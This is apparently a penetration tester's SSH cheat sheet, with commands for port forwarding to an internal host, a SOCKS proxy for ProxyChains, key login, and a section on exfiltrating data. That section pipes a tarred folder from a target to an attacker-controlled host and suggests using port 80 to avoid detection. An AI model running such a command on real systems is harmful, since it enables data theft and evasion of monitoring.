# Create a Tunnel
```bash
# Send local 8080 traffic to host 172.17.0.2
ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.164.248
```

# Over ProxyChains
```bash
ssh -f -N -D 9050 <User>@<Host> -4
```

# Connect with RSA Key
```bash
ssh <User>@<Host> -i id_rsa
```

# Exfiltrate Data
```bash
# From target, tar folder containing data and pipe to SSH.
# Port 80 may be best, to avoid detection on port 22.
# Process will untar file to /tmp/datafolder.

tar zcf - /tmp/datafolder | ssh <user>@<Attack IP Address> "cd /tmp; tar zxpf -"
```
### Data Exfiltration References
[BASH Shell Redirect stderr To stdout (redirect stderr to a File)](https://www.cyberciti.biz/faq/redirecting-stderr-to-stdout/)
